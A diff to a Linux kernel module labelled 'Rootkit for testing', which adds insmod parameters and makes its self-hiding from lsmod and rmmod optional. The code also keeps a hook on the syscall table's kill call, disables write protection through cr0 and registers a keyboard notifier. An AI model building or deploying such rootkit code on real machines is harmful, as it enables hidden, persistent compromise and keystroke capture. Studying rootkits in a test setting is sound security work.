@@ -16,27 +16,25 @@
 #include <linux/syscalls.h>
 #include <linux/kprobes.h>
 #include <linux/version.h>
+#include <linux/moduleparam.h>
+#include "ctrll.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Mitchell Clay");
 MODULE_DESCRIPTION("Rootkit for testing");
 
-int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param);
-void rootkit_hide(void);
-void rootkit_unhide(void);
+// module parameters that can be set from insmod
+// and their defaults here
+static int debug = 0;
+static bool hideonload = true;
+module_param(debug, int, S_IRUGO);
+module_param(hideonload, bool, S_IRUGO);
 
-static struct list_head *module_previous;
 static int hidden = 0;
-static int debug = 1;
 static int ctrll_count = 0;
-unsigned long cr0;
-typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static unsigned long cr0;
 static unsigned long *sys_call_table;
 static t_syscall normal_kill;
-
-static struct notifier_block kb_blk = {
-	.notifier_call = kb_cb,
-};
 
 // Hide from lsmod and rmmod. Keep pointer to previous module in the list so
 // that we know where to jump back in to unhide
@@ -201,8 +199,9 @@ static int __init ctrll_rootkit_init(void) {
 	change_cr0(cr0);
     register_keyboard_notifier(&kb_blk);
     
-	rootkit_hide();
-
+	if (hideonload) {
+		rootkit_hide();
+	}
 	if (debug) {
  	   printk(KERN_INFO "ctrl-L rootkit loaded\n");
 	}
